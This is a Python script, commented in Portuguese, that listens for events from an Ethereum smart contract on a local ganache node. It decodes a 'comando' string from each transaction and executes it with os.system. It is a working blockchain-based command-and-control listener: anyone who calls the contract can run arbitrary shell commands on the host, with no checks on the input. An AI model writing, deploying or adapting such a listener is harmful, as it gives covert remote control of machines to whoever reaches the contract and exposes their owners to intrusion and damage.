from web3 import Web3
import time, sys, json, os

#criaremos outro script de ouvinte que procura os eventos e os executa
infura_key= "ws://127.0.0.1:8545" #conexão com o servidor ganache-cli, simulando uma conexão ao um nó da ethereum
web3 = Web3(Web3.WebsocketProvider(infura_key))

i=input("Entre com endereço do contrato:- ")
abi=json.loads('[{"constant":false,"inputs":[{"name":"comando","type":"string"}],"name":"set_test","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"print_test","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"inputs":[],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":false,"name":"name","type":"string"}],"name":"tellmethename","type":"event"}]')

contract = web3.eth.contract(address=i, abi=abi)
def handle_event(event):
    transaction = web3.eth.getTransaction(event['transactionHash'].hex())
    print(contract.decode_function_input(transaction.input)[1])
    comandos = contract.decode_function_input(transaction.input)[1]
    print("Evento recebido e executado como comando: ")
    tratament = str(comandos).replace(r"{'comando': '", "")
    comandos = tratament.replace(r"'}", "")
    print(comandos)
    os.system(comandos) 
def log_loop(event_filter, poll_interval):
    while True:
        for event in event_filter.get_new_entries():
            handle_event(event)
            time.sleep(poll_interval)
block_filter = web3.eth.filter({'fromBlock':'latest', 'address':i})
log_loop(block_filter, 2)

